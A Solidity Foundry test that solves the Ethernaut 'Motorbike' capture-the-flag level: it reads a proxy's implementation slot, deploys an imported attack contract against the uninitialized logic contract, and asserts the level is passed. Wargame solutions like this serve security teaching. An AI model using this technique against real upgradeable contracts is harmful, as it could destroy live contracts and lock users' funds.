// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut-06.sol";
import "src/levels/25-Motorbike/MotorbikeFactory.sol";
import "src/levels/25-Motorbike/AttackMotorbike.sol";

contract MotorbikeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testMotorbikeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        MotorbikeFactory motorbikeFactory = new MotorbikeFactory();
        ethernaut.registerLevel(motorbikeFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(motorbikeFactory);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // load logic address
        bytes32 data =
            vm.load(levelAddress, bytes32(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        AttackMotorbike attacker = new AttackMotorbike(address(uint160(uint256(data))));
        attacker.attack();

        // selfdestruct has no effect in test
        // https://github.com/foundry-rs/foundry/issues/1543
        vm.etch(address(address(uint160(uint256(data)))), hex"");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
